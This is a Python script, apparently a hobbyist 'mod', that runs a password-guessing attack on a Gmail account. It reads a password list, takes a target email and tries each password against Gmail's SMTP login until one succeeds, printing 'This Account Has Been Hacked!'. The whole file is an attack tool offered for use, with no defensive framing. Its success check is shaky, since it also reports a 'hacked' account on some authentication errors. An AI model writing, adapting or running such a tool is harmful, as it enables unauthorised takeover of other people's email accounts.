#!/usr/bin/python
'''mod by 𝑨𝒎𝒂𝒏𝒐𝒇𝒇 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍'''

import smtplib
from os import system

white="\033[0;37m"
red="\033[0;31m"

def main():
    system('clear')
    
    logo=f"""================================================= 
{red}              Mod by 𝑨𝒎𝒂𝒏𝒐𝒇𝒇 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍                  
{white}=================================================


{red}           𝑨𝒎𝒂𝒏𝒐𝒇𝒇 𝑶𝒇𝒇𝒊𝒄𝒊𝒂𝒍  
                              
{white}       _,.                   
{white}     ,` -.)                  
{white}    ( _/-\\-._               
{white}   /,|`--._,-^|            , 
{white}   \_| |`-._/||          , | 
{white}     |  `-, / |         /  / 
{white}     |     || |        /  /  
{white}      `r-._||/   __   /  /   
{white}  __,-<_     )`-/  `./  /    
{white}  \   `---    \   / /  /     
{white}     |           |./  /      
{white}     /           //  /       
{white} \_/  \         |/  /        
{white}  |    |   _,^- /  /         
{white}  |    , ``  (\/  /_         
{white}   \,.->._    \X-=/^         
{white}   (  /   `-._//^`           
{white}    `Y-.____(__)             
{white}     |     (__)              
{white}           ()  {red} V.1.0 MOD        
{white}"""

    print(logo)
    print('[1] Start the attack')
    print('[2] Exit')
    option = input('==> ')
    
    if option == '1':
        file_path = input('Path of passwords file: ')
        try:
            with open(file_path, 'r') as pass_file:
                pass_list = pass_file.readlines()
        except FileNotFoundError:
            print(f"File '{file_path}' not found.")
            return

        user_name = input('Target email: ')
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()

        for i, password in enumerate(pass_list, 1):
            password = password.strip()
            print(f'{i}/{len(pass_list)}')
            try:
                server.login(user_name, password)
                system('clear')
                print('\n')
                print(f'[+] This Account Has Been Hacked! Password: {password} ^_^')
                break
            except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if '<' in error:
                    system('clear')
                    print(f'[+] This account has been hacked! Password: {password} ^_^')
                    break
                else:
                    print(f'[!] Password not found => {password}')

        server.quit()

    elif option == '2':
        system('clear')
        exit()

if __name__ == "__main__":
    main()